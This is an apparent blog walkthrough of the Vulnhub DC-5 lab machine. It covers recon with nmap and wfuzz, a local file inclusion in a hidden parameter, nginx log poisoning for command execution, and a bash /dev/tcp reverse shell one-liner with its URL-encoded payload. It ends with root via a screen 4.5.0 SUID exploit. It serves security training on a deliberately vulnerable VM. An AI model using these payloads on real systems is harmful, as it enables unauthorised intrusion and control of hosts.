---
layout: single
author_profile: true
title: Vulnhub DC-5 Walkthrough 
date: 2023-10-22
categories:
  - DC-Series
tags: []
header:
  overlay_image: /assets/images/dc-5/cover.png
  overlay_filter: 0.3  # optional, darkens the image for readability
  caption: "DC-5 Vulnhub Walkthrough"
excerpt: "Step-by-step walkthrough of the DC-5 machine from Vulnhub."
feature_row:
  - image_path: /assets/images/dc-5/cover.png
    alt: "DC-5 Cover"
    title: "DC-5 Walkthrough"
    excerpt: "A practical guide to rooting the DC-1 Vulnhub machine."
    url: "#"
    btn_label: "Read More"
    btn_class: "btn--primary"
toc: true
toc_sticky: true
---

This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application's workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.

# Information Gathering

First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|*http-title: Welcome
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33051/tcp   status
|   100024  1          42452/tcp6  status
|   100024  1          45427/udp   status
|*   100024  1          47008/udp6  status
33051/tcp open  status  1 (RPC #100024)
```

From the Nmap results, we identified three open ports. However, the only port of interest is port 80, where the Nginx server is listening. Let's delve into the web application.

**Manual Inspection**

![](/assets/images/dc-5/1.png)

The default homepage has a navbar, but aside from the 'Contact' tab, nothing is interesting to me at the moment. Before we dive deeper into the application, I would like to run a wfuzz fuzzing to discover hidden files.

**Fuzzing**

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL”

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================
000000001:   200        53 L     525 W      4024 Ch     "index.php"
000000043:   200        57 L     752 W      5644 Ch     "faq.php"
000000106:   200        71 L     479 W      4281 Ch     "contact.php
000000482:   200        42 L     66 W       851 Ch      "thankyou.php"
000001951:   200        53 L     560 W      4291 Ch     "about-us.php"
000016294:   200        51 L     525 W      4099 Ch     "solutions.php"
```

During the fuzzing process, the file that caught our interest is 'thankyou.php.' When we fill out all the information in the contact.php form and click the submit button, all the data will be processed inside the thankyou.php file through a GET request. 

![](/assets/images/dc-5/2.png)

Let's inspect this URL more closely to understand and find out if there is any way to get in. After analyzing the URL, I didn't find any vulnerability with any of the parameters. Since it's an intentionally vulnerable box, there is a high possibility of having a vulnerability. However, I have not tried parameter finding yet. So, let's check if there is any hidden parameter for the back-end. For this task, I would like to use WFUZZ tools.

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 --hh 851 "$URL”

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================
000002206:   200        42 L     63 W       835 Ch      "file"
```

There is a hidden parameter called `file`, acting like a light in the darkness. I decided to try viewing the /etc/passwd file, and it worked.

![](/assets/images/dc-5/3.png)

Now that we have LFI, allowing us to read files, we need to confirm the extent of this vulnerability. If we can only read the data, that's helpful, but if we can also execute files, we might gain control of the system. Let's first confirm the capability. I'll attempt to call the index file. If we receive back the raw code, it means we can only read the code. If we see the furnished web application, it indicates code execution as well.

![](/assets/images/dc-5/4.png)

As we can see from the furnished output, it's confirmed that the LFI also has the capability to execute the code. Now, we need to find a way to gain access to the system using this LFI vulnerability. I would like to check all the files accessible through this LFI vulnerability, so I'll run wfuzz again.

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 835 "$URL”

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================                          
000000124:   200        58 L     152 W      1546 Ch     "/etc/apt/sources.list"                                                                                    
000000116:   200        263 L    1162 W     7950 Ch     "/etc/apache2/apache2.conf"                                                                                
000000133:   200        96 L     117 W      1558 Ch     "/etc/group"                                                                                               
000000130:   200        54 L     151 W      1499 Ch     "/etc/fstab"                                                                                               
000000203:   200        52 L     120 W      1246 Ch     "/etc/hosts.allow"                                                                                         
000000204:   200        59 L     174 W      1546 Ch     "/etc/hosts.deny"                                                              
000000126:   200        57 L     187 W      1557 Ch     "/etc/crontab"                                                                                             
000000200:   200        49 L     85 W       1019 Ch     "/etc/hosts"                                    
000000252:   200        70 L     104 W      2319 Ch     "/etc/passwd"                                      
000000245:   200        62 L     124 W      1332 Ch     "/etc/nsswitch.conf"                                
000000244:   200        61 L     166 W      1602 Ch     "/etc/netconfig"                                                                                           
000000241:   200        49 L     103 W      1121 Ch     "/etc/motd"                                                                                                
000000243:   200        170 L    590 W      4368 Ch     "/etc/mysql/my.cnf"                                                                                        
000000232:   200        44 L     68 W       861 Ch      "/etc/issue"                                                                                               
000000231:   200        466 L    1334 W     11019 Ch    "/etc/init.d/apache2"                  
000000394:   200        45 L     69 W       898 Ch      "/etc/resolv.conf"                                                                                         
000000395:   200        82 L     180 W      1722 Ch     "/etc/rpc"                                                                                                 
000000422:   200        46 L     98 W       1114 Ch     "/etc/updatedb.conf"                                                                                       
000000417:   200        130 L    376 W      3376 Ch     "/etc/ssh/sshd_config"                                                                                     
000000492:   200        68 L     230 W      1778 Ch     "/proc/cpuinfo"                                                                                            
000000500:   200        64 L     402 W      4135 Ch     "/proc/net/tcp"                                                                                            
000000505:   200        43 L     78 W       972 Ch      "/proc/version"                                                                                            
000000504:   200        83 L     164 W      1620 Ch     "/proc/self/status"                                                                                        
000000501:   200        49 L     87 W       1011 Ch     "/proc/partitions"                                                                                         
000000502:   200        42 L     66 W       908 Ch      "/proc/self/cmdline"                                                                                       
000000498:   200        46 L     117 W      1281 Ch     "/proc/net/dev"                                                                                            
000000499:   200        45 L     96 W       1219 Ch     "/proc/net/route"                                                                                          
000000497:   200        46 L     90 W       1145 Ch     "/proc/net/arp"                                                                                            
000000494:   200        43 L     68 W       861 Ch      "/proc/loadavg"                                                                                            
000000496:   200        67 L     213 W      2603 Ch     "/proc/mounts"                                                                                             
000000495:   200        86 L     191 W      2061 Ch     "/proc/meminfo"                                                                                            
000000493:   200        104 L    379 W      3735 Ch     "/proc/interrupts"
000000693:   200        47 L     69 W       293123 Ch   "var/log/nginx/access.log"                                 
000000694:   200        42 L     68 W       293123 Ch   "/var/log/lastlog"                                                                                         
000000736:   200        46 L     88 W       13877 Ch    "/var/log/wtmp"                                                                                            
000000745:   200        44 L     70 W       1987 Ch     "/var/run/utmp"                                                                                            
```

We now have access to all these important files on this machine. One of the most interesting files is var/log/nginx/access.log. This file stores all the requests made to the server, along with the corresponding URLs. At this point, my idea is to attempt log poisoning. If we make a request with PHP code inside the URL, the response will be 404, but the PHP code will be present in the log file. As we observed earlier, the LFI also executes code. Therefore, when we access the file during the execution process, the code will be executed. 

![](/assets/images/dc-5/5.png)

We wrote a command injection vulnerable code that will be stored inside the log file. During the opening of the file, we should get command execution. Now, let's verify the command injection.

```bash
curl [http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&cmd=ping](http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&cmd=ping) 192.168.197.131
```

We made a curl request with our desired URL. Here, 'file=/var/log/nginx/access.log' reads the log file, and 'cmd=ping 192.168.197.131' is the command for pinging my local machine, which will verify the command injection. To confirm, we can run a listener on our attack box.

```bash
sudo tcpdump -i eth0 -c5 icmp

Response
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
03:49:14.643611 IP 192.168.197.133 > 192.168.197.131: ICMP echo request, id 1799, seq 9817, length 64
03:49:14.643690 IP 192.168.197.131 > 192.168.197.133: ICMP echo reply, id 1799, seq 9817, length 64
03:49:15.285594 IP 192.168.197.133 > 192.168.197.131: ICMP echo request, id 2258, seq 400, length 64
03:49:15.285628 IP 192.168.197.131 > 192.168.197.133: ICMP echo reply, id 2258, seq 400, length 64
03:49:15.645248 IP 192.168.197.133 > 192.168.197.131: ICMP echo request, id 1799, seq 9818, length 64
5 packets captured
6 packets received by filter
0 packets dropped by kernel
```

We received an ICMP request back, which means the command execution was successful. Now, we can attempt to establish a reverse shell.

# Initial Foothold

Here, we use a one-liner bash reverse shell. We need to encode the shell into URL encoding format to avoid bad characters since we are using a browser.

```bash
Reverse shell
bash -c 'bash -i >& /dev/tcp/192.168.197.131/9001 0>&1'

Full Payload
[http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&cmd=bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F192.168.197.131%2F9001 0>%261'](http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.197.131%2F9001%200%3E%261%27)
```

![](/assets/images/dc-5/6.png)

We obtained the reverse shell, successfully gaining the initial foothold.

# Privilege Escalation

After obtaining the shell, I attempted to locate sensitive files, check privileges, and identify misconfigurations, but I did not find anything noteworthy. I then tried searching for GUIDs, but nothing interesting turned up. Finally, I explored SUID and discovered 'screen 4.5.0,' which seemed intriguing to me. I decided to investigate further.

![](/assets/images/dc-5/7.png)

From the exploitDB database i found privilege escalation script.

![](/assets/images/dc-5/8.png)

here i download the script using searchsploit kali linux builtin tools from exploit DB.

![](/assets/images/dc-5/9.png)

I start a python http server to transfer the payload to the victim machine.

![](/assets/images/dc-5/10.png)

from the victim machine i saw there is wget so its easier to download through wget.

![](/assets/images/dc-5/11.png)

Through wget i download the file to victim machine.

![](/assets/images/dc-5/12.png)

I made the file executable, ran it as is, and now I have root access.

![](/assets/images/dc-5/13.png)

The privilege escalation was quite easy. There wasn't anything complex; I just needed to find the right payload, transfer it to the victim computer, make it executable, and execute it. The permissions were then changed to root.